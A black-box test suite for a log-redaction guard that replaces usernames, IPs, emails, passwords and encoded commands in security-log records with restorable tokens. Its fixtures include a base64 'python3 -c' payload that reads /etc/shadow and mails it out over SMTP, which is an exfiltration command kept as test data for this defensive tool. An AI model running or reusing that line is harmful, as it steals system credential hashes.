// Black-box tests for Contract 1 (src/guard/record.ts), written from the hib-pipe spec and README's description of
// sensitive-folder Read copies, not from the implementation.
import { describe, expect, test } from "bun:test";
import { defaultPolicy, guardLine, guardRecord, GuardState } from "../src/guard/record";
import { Vault } from "../src/guard/vault";

const TAG = "ab12";
const fresh = (maxKnown?: number) => new GuardState(new Vault(TAG), maxKnown);
const TOKEN = /\[HIBab12-[A-Z0-9-]+?-\d+\]/g;
const tokenOf = (category: string) => new RegExp(`^\\[HIB${TAG}-${category}-\\d+\\]$`);
const tokensIn = (s: string) => s.match(TOKEN) ?? [];

/** No planted value appears anywhere in the output, in any case. */
function noLeak(out: unknown, planted: string[]) {
  const json = JSON.stringify(out).toLowerCase();
  for (const p of planted) expect(json).not.toContain(p.toLowerCase());
}

const ecs = () => ({
  "@timestamp": "2026-11-13T08:00:00Z",
  event: { action: "logon-failed", category: ["authentication"], outcome: "failure" },
  user: { name: "jdoe", id: 1001 },
  source: { ip: "203.0.113.45", port: 51515 },
  process: { name: "sshd", pid: 4242 },
  message: "Failed password for jdoe from 203.0.113.45 port 51515 ssh2",
});

describe("guardRecord: ECS", () => {
  test("nested identifying fields hidden, thing names readable, flat output", () => {
    const state = fresh();
    const out = guardRecord(ecs(), state, defaultPolicy());
    const r = out.record;
    expect(Object.keys(r).sort()).toEqual(
      ["@timestamp", "event.action", "event.category", "event.outcome", "message", "process.name", "process.pid", "source.ip", "source.port", "user.id", "user.name"].sort(),
    );
    expect(r["user.name"]).toMatch(tokenOf("USER-NAME"));
    expect(r["source.ip"]).toMatch(tokenOf("IP-EXTERNAL-NET\\d+")); // an IP keeps its /24 group whatever the field is called
    expect(r["user.id"]).toMatch(tokenOf("USER-ID")); // a number in an id-like identifying field is tokenised too
    expect(r["process.name"]).toBe("sshd");
    expect(r["process.pid"]).toBe(4242);
    expect(r["event.action"]).toBe("logon-failed");
    expect(r["event.category"]).toBe("authentication"); // one-element scalar array unwrapped
    expect(r["@timestamp"]).toBe("2026-11-13T08:00:00Z");
    expect(out.hidden).toEqual(expect.arrayContaining(["user.name", "source.ip", "user.id"]));
    expect(out.hidden).not.toContain("process.name");
    expect(out.hidden).not.toContain("event.action");
    // The hidden values reappear in the message with the same tokens.
    const msg = r["message"] as string;
    expect(msg).toContain(r["user.name"] as string);
    expect(msg).toContain(r["source.ip"] as string);
    expect(msg).toStartWith("Failed password for ");
    noLeak(out, ["jdoe", "203.0.113.45", "1001"]);
  });

  test("tokens restore through the state's vault", () => {
    const state = fresh();
    const out = guardRecord(ecs(), state, defaultPolicy());
    expect(state.vault.restore(out.record["user.name"] as string)).toBe("jdoe");
    expect(state.vault.restore(out.record["source.ip"] as string)).toBe("203.0.113.45");
    expect(state.vault.restore(String(out.record["user.id"]))).toBe("1001");
    expect(state.vault.restore(out.record["message"] as string)).toBe("Failed password for jdoe from 203.0.113.45 port 51515 ssh2");
    noLeak(out, ["jdoe", "203.0.113.45", "1001"]);
  });
});

describe("guardRecord: Wazuh full_log", () => {
  const wazuh = () => ({
    agent: { name: "WIN-FS01", id: "003" },
    manager: { name: "wazuh-mgr-01" },
    rule: { description: "GCP audit: IAM policy changed", level: 5, id: "60106" },
    decoder: { name: "json" },
    full_log: JSON.stringify({
      protoPayload: {
        methodName: "SetIamPolicy",
        serviceName: "cloudresourcemanager.googleapis.com",
        authenticationInfo: { principalEmail: "ana.kovac@acme-corp.io" },
        requestMetadata: { callerIp: "198.51.100.23" },
      },
    }),
  });

  test("JSON-in-string is flattened, its identifying leaves hidden, the original column gone", () => {
    const state = fresh();
    const out = guardRecord(wazuh(), state, defaultPolicy());
    const r = out.record;
    expect(r).not.toHaveProperty("full_log");
    expect(r["full_log.protoPayload.methodName"]).toBe("SetIamPolicy");
    expect(r["full_log.protoPayload.requestMetadata.callerIp"]).toMatch(tokenOf("IP-EXTERNAL-NET\\d+"));
    expect(r["full_log.protoPayload.authenticationInfo.principalEmail"]).toMatch(
      new RegExp(`^\\[HIB${TAG}-FULL-LOG-PROTOPAYLOAD-AUTHENTICATIONINFO-PRINCIPALEMAIL-\\d+\\]@\\[HIB${TAG}-DOMAIN-\\d+\\]$`),
    );
    expect(r["agent.name"]).toMatch(tokenOf("AGENT-NAME"));
    expect(r["manager.name"]).toMatch(tokenOf("MANAGER-NAME"));
    expect(r["decoder.name"]).toBe("json");
    expect(r["rule.description"]).toBe("GCP audit: IAM policy changed");
    expect(r["rule.level"]).toBe(5);
    expect(out.hidden).toEqual(
      expect.arrayContaining(["agent.name", "manager.name", "full_log.protoPayload.requestMetadata.callerIp", "full_log.protoPayload.authenticationInfo.principalEmail"]),
    );
    expect(state.vault.restore(r["full_log.protoPayload.authenticationInfo.principalEmail"] as string)).toBe("ana.kovac@acme-corp.io");
    noLeak(out, ["WIN-FS01", "wazuh-mgr-01", "ana.kovac", "acme-corp.io", "198.51.100.23"]);
  });
});

describe("guardRecord: known values across records", () => {
  test("a vault from an earlier run hides its values in free text from the first event of the next run", () => {
    const first = fresh();
    const a = guardRecord({ user: { name: "jdoe" } }, first, defaultPolicy()).record;
    const next = new GuardState(Vault.from(first.vault.state()));
    const line = guardLine("Accepted publickey for jdoe", next, defaultPolicy()).text;
    expect(line).toBe(`Accepted publickey for ${a["user.name"]}`);
  });
  test("hidden IP fields keep their /24 group across fields and records, and match the same IP in free text", () => {
    const state = fresh();
    const a = guardRecord({ source: { ip: "10.1.2.3" }, destination: { ip: "10.1.2.99" } }, state, defaultPolicy()).record;
    const b = guardRecord({ client: { ip: "10.9.9.9" }, message: "retry from 10.1.2.3" }, state, defaultPolicy()).record;
    const net = (t: unknown) => String(t).match(/IP-INTERNAL-(NET\d+)/)?.[1];
    expect(net(a["source.ip"])).toBeDefined();
    expect(net(a["source.ip"])).toBe(net(a["destination.ip"]));
    expect(net(b["client.ip"])).not.toBe(net(a["source.ip"]));
    expect(String(b.message)).toContain(String(a["source.ip"]));
    noLeak([a, b], ["10.1.2.3", "10.1.2.99", "10.9.9.9"]);
  });

  test("a username hidden in user.name gets the same token as CORP\\jdoe and C:\\Users\\jdoe in a later message", () => {
    const state = fresh();
    const first = guardRecord({ user: { name: "jdoe" }, event: { action: "logon" } }, state, defaultPolicy());
    const tok = first.record["user.name"] as string;
    expect(tok).toMatch(tokenOf("USER-NAME"));
    const later = guardRecord(
      { event: { action: "process-start" }, message: "Process started by CORP\\jdoe: C:\\Users\\jdoe\\AppData\\Local\\Temp\\run.exe" },
      state,
      defaultPolicy(),
    );
    const msg = later.record["message"] as string;
    expect(msg.split(tok).length - 1).toBe(2);
    expect(msg).toStartWith("Process started by CORP\\");
    expect(msg).toContain("\\AppData\\Local\\Temp\\run.exe");
    expect(later.record["event.action"]).toBe("process-start");
    expect(later.hidden).not.toContain("message");
    expect(state.vault.restore(msg)).toBe("Process started by CORP\\jdoe: C:\\Users\\jdoe\\AppData\\Local\\Temp\\run.exe");
    noLeak([first, later], ["jdoe"]);
  });

  test("known values are replaced in any case", () => {
    const state = fresh();
    const first = guardRecord({ user: { name: "jdoe" } }, state, defaultPolicy());
    const later = guardRecord({ message: "account JDOE locked out" }, state, defaultPolicy());
    expect(later.record["message"]).toBe(`account ${first.record["user.name"]} locked out`);
    noLeak([first, later], ["jdoe"]);
  });

  test("email split into name and DOMAIN tokens; the domain token is shared across records", () => {
    const state = fresh();
    const a = guardRecord({ user: { email: "ana.kovac@acme-corp.io" } }, state, defaultPolicy());
    const b = guardRecord({ destination: { user: { email: "marko.horvat@acme-corp.io" } } }, state, defaultPolicy());
    const ea = a.record["user.email"] as string;
    const eb = b.record["destination.user.email"] as string;
    const re = /^\[(HIBab12-[A-Z0-9-]+-\d+)\]@\[(HIBab12-DOMAIN-\d+)\]$/;
    const ma = ea.match(re)!;
    const mb = eb.match(re)!;
    expect(ma).not.toBeNull();
    expect(mb).not.toBeNull();
    expect(ma[1]).toMatch(/-USER-EMAIL-\d+$/);
    expect(mb[1]).toMatch(/-DESTINATION-USER-EMAIL-\d+$/);
    expect(ma[2]).toBe(mb[2]!);
    expect(state.vault.restore(ea)).toBe("ana.kovac@acme-corp.io");
    expect(state.vault.restore(eb)).toBe("marko.horvat@acme-corp.io");
    noLeak([a, b], ["ana.kovac", "marko.horvat", "acme-corp.io"]);
  });

  test("a hidden email reappearing in a later message gets the same tokens", () => {
    const state = fresh();
    const a = guardRecord({ user: { email: "ana.kovac@acme-corp.io" } }, state, defaultPolicy());
    const b = guardRecord({ message: "password reset mailed to ana.kovac@acme-corp.io today" }, state, defaultPolicy());
    expect(b.record["message"]).toBe(`password reset mailed to ${a.record["user.email"]} today`);
    noLeak([a, b], ["ana.kovac", "acme-corp.io"]);
  });

  test("IPs in the same /24 share NETn in readable text, across records", () => {
    const state = fresh();
    const a = guardRecord({ message: "connection from 10.20.30.5 refused" }, state, defaultPolicy());
    const b = guardRecord({ message: "connection from 10.20.30.77 refused, retry via 10.99.1.1" }, state, defaultPolicy());
    const net = (t: string) => t.match(/-(NET\d+)-\d+\]$/)?.[1];
    const [ta] = tokensIn(a.record["message"] as string);
    const [tb, tc] = tokensIn(b.record["message"] as string);
    expect(ta).toMatch(/IP-INTERNAL-NET\d+-\d+\]$/);
    expect(net(ta!)).toBeDefined();
    expect(net(ta!)).toBe(net(tb!)!);
    expect(net(tc!)).not.toBe(net(ta!)!);
    expect(ta).not.toBe(tb!);
    noLeak([a, b], ["10.20.30.5", "10.20.30.77", "10.99.1.1"]);
  });
});

describe("guardRecord: values and regex guard", () => {
  test("an internal FQDN in an innocuous field name is hidden whole", () => {
    const state = fresh();
    const out = guardRecord({ labels: { target: "dc01.corp.acme.local" }, event: { action: "kerberos-tgs" } }, state, defaultPolicy());
    expect(out.record["labels.target"]).toMatch(tokenOf("LABELS-TARGET"));
    expect(out.hidden).toContain("labels.target");
    expect(out.record["event.action"]).toBe("kerberos-tgs");
    noLeak(out, ["dc01.corp.acme.local", "acme.local"]);
  });

  test("an IP or a phone as a whole value in an innocuous field is hidden", () => {
    const state = fresh();
    const out = guardRecord({ labels: { peer: "172.16.4.9", contact: "+385 91 234 5678" } }, state, defaultPolicy());
    expect(out.hidden).toEqual(expect.arrayContaining(["labels.peer", "labels.contact"]));
    noLeak(out, ["172.16.4.9", "234 5678"]);
  });

  test("a password on a command line in a readable field is replaced, the rest stays", () => {
    const state = fresh();
    const out = guardRecord(
      { process: { name: "mysql", command_line: "mysql -u app -pS3cr3tPassw0rd orders" }, event: { action: "exec" } },
      state,
      defaultPolicy(),
    );
    const cmd = out.record["process.command_line"] as string;
    expect(out.hidden).not.toContain("process.command_line");
    expect(cmd).toStartWith("mysql -u app -p");
    expect(cmd).toMatch(/\[HIBab12-PASSWORD-\d+\]/);
    expect(cmd).toEndWith(" orders");
    expect(out.findings.map((f) => f.category)).toContain("PASSWORD");
    expect(out.record["process.name"]).toBe("mysql");
    noLeak(out, ["S3cr3tPassw0rd"]);
  });

  test("a base64 python -c payload containing an email is hidden whole", () => {
    const state = fresh();
    const b64 = Buffer.from("import smtplib; smtplib.SMTP('mx').sendmail('x', 'ana.kovac@acme-corp.io', open('/etc/shadow').read())").toString("base64");
    const out = guardRecord({ event: { action: "sudo" }, message: `jdoe : TTY=pts/0 ; COMMAND=/bin/python3 -c ${b64}` }, state, defaultPolicy());
    const msg = out.record["message"] as string;
    expect(msg).toMatch(/COMMAND=\/bin\/python3 -c \[HIBab12-[A-Z0-9-]*ENCODED-\d+\]$/);
    expect(state.vault.restore(msg)).toContain(b64);
    noLeak(out, [b64, b64.slice(0, 24), "ana.kovac", "acme-corp.io"]);
  });

  test("a base64 payload naming only a known hidden value is hidden whole", () => {
    const state = fresh();
    const first = guardRecord({ user: { name: "mhorvat" } }, state, defaultPolicy());
    const b64 = Buffer.from("echo started for mhorvat; sleep 30; echo done now").toString("base64");
    const later = guardRecord({ message: `COMMAND=/bin/bash -c ${b64}` }, state, defaultPolicy());
    const msg = later.record["message"] as string;
    expect(msg).toMatch(/^COMMAND=\/bin\/bash -c \[HIBab12-[A-Z0-9-]*ENCODED-\d+\]$/);
    noLeak([first, later], [b64, b64.slice(0, 24), "mhorvat"]);
  });

  test("keep leaves a field readable but still regex-guarded", () => {
    const state = fresh();
    const out = guardRecord(
      { source: { geo: { city_name: "Zagreb" } }, user: { email: "ana.kovac@acme-corp.io", name: "jdoe" } },
      state,
      defaultPolicy({ keep: ["source.geo.city_name", "user.email"] }),
    );
    expect(out.record["source.geo.city_name"]).toBe("Zagreb");
    expect(out.hidden).not.toContain("source.geo.city_name");
    expect(out.hidden).not.toContain("user.email");
    expect(out.hidden).toContain("user.name");
    const email = out.record["user.email"] as string;
    expect(email).not.toMatch(/^\[HIBab12-USER-EMAIL-\d+\]/); // not hidden as a column...
    expect(tokensIn(email).length).toBeGreaterThan(0); // ...but the regex guard still replaced the address
    noLeak(out, ["ana.kovac", "acme-corp.io", "jdoe"]);
  });

  test("without keep, city_name is hidden by name", () => {
    const out = guardRecord({ source: { geo: { city_name: "Zagreb" } } }, fresh(), defaultPolicy());
    expect(out.record["source.geo.city_name"]).toMatch(tokenOf("SOURCE-GEO-CITY-NAME"));
    noLeak(out, ["Zagreb"]);
  });

  test("hide forces a field, numbers and booleans included", () => {
    const state = fresh();
    const out = guardRecord(
      { event: { action: "login", outcome: "success" }, http: { response: { status_code: 404 } }, user: { admin: true }, process: { name: "sshd" } },
      state,
      defaultPolicy({ hide: ["event.outcome", "http.response.status_code", "user.admin"] }),
    );
    expect(out.record["event.outcome"]).toMatch(tokenOf("EVENT-OUTCOME"));
    expect(out.record["http.response.status_code"]).toMatch(tokenOf("HTTP-RESPONSE-STATUS-CODE"));
    expect(out.record["user.admin"]).toMatch(tokenOf("USER-ADMIN"));
    expect(out.hidden).toEqual(expect.arrayContaining(["event.outcome", "http.response.status_code", "user.admin"]));
    expect(out.record["event.action"]).toBe("login");
    expect(out.record["process.name"]).toBe("sshd");
    expect(state.vault.restore(out.record["http.response.status_code"] as string)).toBe("404");
    expect(state.vault.restore(out.record["user.admin"] as string)).toBe("true");
    noLeak(out, ["success", "404"]);
  });

  test("numbers in id-like identifying fields are tokenised; counts are not", () => {
    const out = guardRecord({ user: { id: 501 }, customer_id: 77123, process: { pid: 777 }, loginCount: 3 }, fresh(), defaultPolicy());
    expect(out.record["user.id"]).toMatch(tokenOf("USER-ID"));
    expect(out.record["customer_id"]).toMatch(tokenOf("CUSTOMER-ID"));
    expect(out.record["process.pid"]).toBe(777);
    expect(out.record["loginCount"]).toBe(3);
    noLeak(out, ["501", "77123"]);
  });

  test("field names are not tokenised", () => {
    const out = guardRecord({ "user.name": "jdoe", "source.ip": "203.0.113.45" }, fresh(), defaultPolicy());
    expect(Object.keys(out.record).sort()).toEqual(["source.ip", "user.name"]);
    noLeak(out, ["jdoe", "203.0.113.45"]);
  });
});

describe("guardRecord: non-object input", () => {
  test("a number becomes { value }", () => {
    const out = guardRecord(42, fresh(), defaultPolicy());
    expect(out.record).toEqual({ value: 42 });
  });

  test("an array becomes one value cell, still guarded", () => {
    const out = guardRecord(["10.1.2.3", "ana.kovac@acme-corp.io"], fresh(), defaultPolicy());
    expect(Object.keys(out.record)).toEqual(["value"]);
    expect(typeof out.record["value"]).toBe("string");
    noLeak(out, ["10.1.2.3", "ana.kovac", "acme-corp.io"]);
  });

  test("a bare email string is hidden as value", () => {
    const state = fresh();
    const out = guardRecord("ana.kovac@acme-corp.io", state, defaultPolicy());
    expect(Object.keys(out.record)).toEqual(["value"]);
    expect(state.vault.restore(out.record["value"] as string)).toBe("ana.kovac@acme-corp.io");
    noLeak(out, ["ana.kovac", "acme-corp.io"]);
  });

  test("a string holding a JSON object is flattened like any JSON-in-string", () => {
    const out = guardRecord(JSON.stringify({ user: { name: "jdoe" }, process: { name: "sshd" } }), fresh(), defaultPolicy());
    expect(out.record["user.name"]).toMatch(tokenOf("USER-NAME"));
    expect(out.record["process.name"]).toBe("sshd");
    noLeak(out, ["jdoe"]);
  });

  test("null does not throw", () => {
    const out = guardRecord(null, fresh(), defaultPolicy());
    expect(out.record).toEqual({ value: null });
  });
});

describe("GuardState", () => {
  test("tokens are stable for the same state and match the vault", () => {
    const state = fresh();
    const a = guardRecord(ecs(), state, defaultPolicy());
    const b = guardRecord(ecs(), state, defaultPolicy());
    expect(b.record).toEqual(a.record);
    for (const t of tokensIn(JSON.stringify(a.record))) expect(state.vault.lookup(t.slice(1, -1))).toBeDefined();
    noLeak([a, b], ["jdoe", "203.0.113.45", "1001"]);
  });

  test("a vault restored from its state gives the same tokens (across runs)", () => {
    const s1 = fresh();
    const a = guardRecord(ecs(), s1, defaultPolicy());
    const s2 = new GuardState(Vault.from(s1.vault.state()));
    const b = guardRecord(ecs(), s2, defaultPolicy());
    expect(b.record["user.name"]).toBe(a.record["user.name"]!);
    expect(b.record["source.ip"]).toBe(a.record["source.ip"]!);
    expect(s2.vault.restore(JSON.stringify(b.record))).toContain('"user.name":"jdoe"');
    noLeak([a, b], ["jdoe", "203.0.113.45"]);
  });

  test("defaultPolicy: standard level, everything else empty, overrides applied", () => {
    expect(defaultPolicy()).toEqual({ level: "standard", hide: [], keep: [], terms: [], patterns: [] });
    expect(defaultPolicy({ hide: ["x"] }).hide).toEqual(["x"]);
    expect(defaultPolicy({ level: "paranoid" }).level).toBe("paranoid");
  });

  test("maxKnown bounds the remembered values; the oldest is dropped, the vault keeps it", () => {
    const state = fresh(2);
    const toks = ["alpha1x", "bravo2x", "charlie3x"].map((n) => guardRecord({ user: { name: n } }, state, defaultPolicy()).record["user.name"] as string);
    const later = guardRecord({ message: "seen alpha1x then charlie3x" }, state, defaultPolicy());
    const msg = later.record["message"] as string;
    expect(msg).toContain("alpha1x"); // dropped from the known set: readable in free text again
    expect(msg).toContain(toks[2]!);
    expect(msg).not.toContain("charlie3x");
    // The vault still maps it: a hidden field with the old value gets its old token.
    expect(guardRecord({ user: { name: "alpha1x" } }, state, defaultPolicy()).record["user.name"]).toBe(toks[0]!);
    noLeak(later, ["charlie3x"]);
  });

  test("terms from the policy are guarded in readable fields", () => {
    const out = guardRecord({ message: "escalated to Project Nightjar team" }, fresh(), defaultPolicy({ terms: ["Project Nightjar"] }));
    noLeak(out, ["Nightjar"]);
  });

  test("custom patterns from the policy are guarded in readable fields", () => {
    const out = guardRecord(
      { message: "ticket CASE-778812 opened" },
      fresh(),
      defaultPolicy({ patterns: [{ category: "CASE", regex: "CASE-\\d{6}" }] }),
    );
    expect(out.record["message"]).toMatch(/^ticket \[HIBab12-CASE-\d+\] opened$/);
    noLeak(out, ["778812"]);
  });
});

describe("guardLine", () => {
  test("a syslog line: IP and user= replaced, the rest readable", () => {
    const state = fresh();
    const line = "Nov 13 08:00:01 web-07 sshd[4242]: Accepted password for user=mhorvat from 192.168.10.44 port 51234 ssh2";
    const out = guardLine(line, state, defaultPolicy());
    expect(out.text).toStartWith("Nov 13 08:00:01 web-07 sshd[4242]: Accepted password for user=");
    expect(out.text).toEndWith(" port 51234 ssh2");
    expect(out.text).toMatch(/\[HIBab12-IP-INTERNAL-NET\d+-\d+\]/);
    const cats = out.findings.map((f) => f.category);
    expect(cats).toContain("USER");
    expect(cats).toContain("IP-INTERNAL");
    expect(state.vault.restore(out.text)).toBe(line);
    noLeak(out, ["mhorvat", "192.168.10.44"]);
  });

  test("shares known values and tokens with records in the same state", () => {
    const state = fresh();
    const rec = guardRecord({ user: { name: "jdoe" }, source: { ip: "203.0.113.45" } }, state, defaultPolicy());
    const out = guardLine("Failed password for jdoe from 203.0.113.45", state, defaultPolicy());
    expect(out.text).toBe(`Failed password for ${rec.record["user.name"]} from ${rec.record["source.ip"]}`);
    noLeak([rec, out], ["jdoe", "203.0.113.45"]);
  });

  test("a line with nothing sensitive comes back unchanged", () => {
    const out = guardLine("service restarted after config reload", fresh(), defaultPolicy());
    expect(out.text).toBe("service restarted after config reload");
    expect(out.findings).toEqual([]);
  });
});
